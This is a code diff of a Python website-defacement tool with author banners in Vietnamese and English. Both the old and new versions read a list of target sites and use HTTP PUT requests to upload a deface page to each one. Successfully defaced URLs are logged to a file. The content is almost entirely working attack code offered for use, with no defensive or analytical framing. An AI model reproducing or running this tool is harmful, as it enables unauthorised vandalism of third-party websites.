@@ -1,78 +1,70 @@
-#-*- coding: utf-8 -*-
+import requests
+import sys
+import os
+import time
+from colorama import Fore,Style
 
-try:
-   import requests
-   import os.path
-   import sys
-except ImportError:
-   exit("install requests and try again ...")
-   
-os.system("git pull")
+class colors:
+    CRED2 = "\33[91m"
+    CBLUE2 = "\33[94m"
+    ENDC = "\033[0m"
 
-banner = """
- ░█▀▀▄ ░█▀▀▀ ░█▀▀▀ ─█▀▀█ ░█▀▀█ ░█▀▀▀ 
- ░█─░█ ░█▀▀▀ ░█▀▀▀ ░█▄▄█ ░█─── ░█▀▀▀ 
- ░█▄▄▀ ░█▄▄▄ ░█─── ░█─░█ ░█▄▄█ ░█▄▄▄ 
-================================================================
-\033[32mTool author  : Thành Vinh
-\033[33mZalo Me      : zalo.me/0927423139
-\033[33mTelegram     : https://t.me/Vinyetquaidan
-================================================================
-"""
 
-b = '\033[31m'
-h = '\033[32m'
-m = '\033[00m'
+banner = ("""
+                                                                                                                
+                █▀▀▄ █▀▀ ── █▀▀▄ █▀▀ █▀▀ █▀▀█ █▀▀ █▀▀ █▀▀█ 
+                █──█ ▀▀█ ▀▀ █──█ █▀▀ █▀▀ █▄▄█ █── █▀▀ █▄▄▀ 
+                ▀──▀ ▀▀▀ ── ▀▀▀─ ▀▀▀ ▀── ▀──▀ ▀▀▀ ▀▀▀ ▀─▀▀    v1.0 """)
+                                                                                                                                                                                                                       
+                                                                                                                                                                                                                       
+for col in banner:
+    print(colors.CRED2 + col, end="")
+    sys.stdout.flush()
+    time.sleep(0.0025)
 
-def eagle(tetew):
-   ipt = ''
-   if sys.version_info.major > 2:
-      ipt = input(tetew)
-   else:
-      ipt = raw_input(tetew)
-   
-   return str(ipt)
+x = ("""
+                Author:  NgThanhVinh | NS-ROOT
+                Github:  https://github.com/Vntvxyz
+                Website: https://NgThanhVinh.Info \n """)
+for col in x:
+    print(colors.CBLUE2 + col, end="")
+    sys.stdout.flush()
+    time.sleep(0.0040)
+
+y = "\n\t\tĐợi xíu Bro !!! 😃\n"
+for col in y:
+    print(colors.CRED2 + col, end="")
+    sys.stdout.flush()
+    time.sleep(0.0040)
+
+z = "\n"
+for col in z:
+    print(colors.ENDC + col, end="")
+    sys.stdout.flush()
+    time.sleep(0.4)
+
 def main():
 	list= "list.txt"
 	opened=open(list,"r")
-def white(script,target_file="targets.txt"):
-   op = open(script,"r").read()
-   with open(target_file, "r") as target:
-      target = target.readlines()
-      s = requests.Session()
-      print("uploading  your script to %d website"%(len(target)))
-      for web in target:
-         try:
-            site = web.strip()
-            if site.startswith("http://") is False:
-               site = "http://" + site
-            req = s.put(site+"/"+script,data=op)
-            if req.status_code < 200 or req.status_code >= 250:
-               print(m+"["+b+" FAILED TO UPLOAD !"+m+" ] %s/%s"%(site,script))
-            else:
-               print(m+"["+h+" SUCCESSFULLY UPLOADED"+m+" ] %s/%s"%(site,script))
+	d= "index.html"
+	data=open(d).read()
+	d="/"+d
+	for i in opened:
+		try:
+			i=i.strip()
+			if 'http://' not in i:
+				i='http://'+i
+			req=requests.Session().put(i+d,data=data)
+			if req.status_code==200:
+				print(Fore.CYAN,"Success==>",Style.RESET_ALL,i+d)
+				f=open("ns-success.txt","a")
+				f.write(i+d+"\n")
+				f.close()
+			else:
+				print(Fore.MAGENTA,"Fail==>",Style.RESET_ALL,i+d)
+		except  requests.exceptions.RequestException:
+			continue
 
-         except requests.exceptions.RequestException:
-            continue
-         except KeyboardInterrupt:
-            print; exit()
-
-def main(__bn__):
-   print(__bn__)
-   while True:
-      try:
-         print('Nhập File Bạn Ơi ')
-         print(' ')
-         a = eagle("[+]Enter your deface [ex: .txt] : ")
-         if not os.path.isfile(a):
-            print("file '%s' not found"%(a))
-            continue
-         else:
-            break
-      except KeyboardInterrupt:
-         print; exit()
-
-   white(a)
-
-if __name__ == "__main__":
-    main(banner)
+banner
+main()
+print('\n',Fore.CYAN,'  [+]',Style.RESET_ALL,'All Defaced Sites are Saved in ns-success.txt',Fore.CYAN,'[+]',Style.RESET_ALL)
